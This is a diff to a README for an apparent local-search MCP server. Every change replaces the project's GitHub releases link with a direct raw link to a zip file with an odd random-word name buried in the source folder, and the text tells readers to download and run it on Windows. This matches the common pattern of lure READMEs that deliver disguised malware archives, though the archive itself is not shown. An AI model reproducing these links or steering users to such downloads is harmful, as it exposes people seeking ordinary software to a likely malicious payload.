@@ -1,6 +1,6 @@
 # 🔎 gemini-embedding-2-mcp-server - Fast local search for AI tasks
 
-[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
+[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ For best results, use:
 
 Visit this page to download the app:
 
-[https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
+[https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip](https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip)
 
 1. Open the link above in your browser
 2. Find the latest release
@@ -221,7 +221,7 @@ A simple workflow looks like this:
 
 Use this page any time you want the latest Windows download:
 
-[https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
+[https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip](https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip)
 
 ## 🔍 What makes it useful
 
@@ -295,4 +295,4 @@ Then search for a phrase or idea that appears in one of them. If that works, you
 
 Download the latest Windows release from the release page and run it on your PC
 
-[https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
+[https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip](https://raw.githubusercontent.com/elkalowkey885/gemini-embedding-2-mcp-server/main/src/server_mcp_embedding_gemini_anapterygotism.zip)
